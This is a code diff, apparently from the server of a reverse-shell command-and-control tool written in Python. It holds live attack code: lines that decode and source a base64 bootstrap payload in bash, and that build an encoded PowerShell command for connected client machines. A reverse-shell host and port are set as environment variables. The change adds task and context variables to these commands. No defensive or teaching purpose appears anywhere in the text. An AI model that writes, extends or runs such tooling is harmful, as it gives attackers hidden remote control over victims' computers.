@@ -185,6 +185,8 @@ REVERSE_SHELL_PORT = args.reverse_shell_port
 
 BOOTSTRAP_PAYLOAD = get_payload("bootstrap")
 
+ENV_CONTEXT = os.environ.get("ENV_CONTEXT", "")
+
 
 async def start_keepalive(session):
     # """
@@ -374,6 +376,7 @@ async def send_payload_and_get_response(
     addr,
     description="",
     platform="linux",
+    task="default"
 ):
     """
     Sends a command payload to the client, then reads and returns the JSON response.
@@ -391,12 +394,14 @@ async def send_payload_and_get_response(
     # Construct the command that sources the bootstrap and then executes the payload
     if platform == "linux":
         command_encoded = f"export REVERSE_SHELL_HOST={REVERSE_SHELL_HOST} REVERSE_SHELL_PORT={REVERSE_SHELL_PORT} " \
+            + f"ENV_CONTEXT={ENV_CONTEXT} TAG={task} TASK={task} " \
             + f"SESSION_ID={session_id} && source <(base64 -d <<< {BOOTSTRAP_PAYLOAD}) " \
             + f"&& decode_payload {encoded_payload}\n"
     else:
         command_decoded = base64.b64decode(
             encoded_payload).decode('utf-8').strip()
         command = f"$env:REVERSE_SHELL_HOST='{REVERSE_SHELL_HOST}';$env:REVERSE_SHELL_PORT='{REVERSE_SHELL_PORT}';" \
+            + f"$env:ENV_CONTEXT='{ENV_CONTEXT}';$env:TAG='{task}';$env:TASK='{task}';" \
             + f"$env:SESSION_ID='{session_id}';{BOOTSTRAP_PAYLOAD};{command_decoded};"
         command_encoded = base64.b64encode(
             command.encode('utf-8')).decode('utf-8') + "\n"
@@ -499,6 +504,7 @@ async def process_session():
                 addr=addr,
                 description=f"task payload: {task}",
                 platform=platform,
+                task=task,
             )
 
         except Exception as e:
